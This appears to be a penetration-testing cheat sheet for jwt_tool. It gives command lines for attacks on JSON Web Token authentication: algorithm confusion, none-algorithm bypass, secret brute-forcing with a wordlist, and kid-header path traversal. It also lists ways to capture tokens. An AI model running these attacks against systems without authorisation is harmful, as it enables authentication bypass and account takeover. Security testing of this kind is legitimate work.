# jwt_tool — Advanced Techniques

## All Attacks Mode (Recommended Starting Point)
```bash
jwt_tool [token] -M at
```

## Algorithm Confusion (RS256 → HS256)
```bash
jwt_tool [token] -X a
```
If server uses RS256 but accepts HS256 with public key as HMAC secret = Critical vulnerability.

## None Algorithm
```bash
jwt_tool [token] -X a  # also tests none
```
Tests if server accepts unsigned token — authentication bypass.

## Brute Force Weak Secret
```bash
jwt_tool [token] -C -d /usr/share/wordlists/rockyou.txt
```
Common weak secrets: `secret`, `password`, `123456`, `jwt_secret`, `changeme`.

## Key ID (kid) Parameter Injection
```bash
jwt_tool [token] -I -hc kid -hv "../../dev/null"
```
Tests path traversal in kid header.

## Specify Key for Attack
```bash
jwt_tool [token] -k public_key.pem -X a
```

## Getting Tokens
- Browser: DevTools → Application → Local Storage / Cookies
- Network: DevTools → Network → Authorization header
- Burp Suite: capture authenticated request, copy Bearer token
- Mobile: proxy through mitmproxy
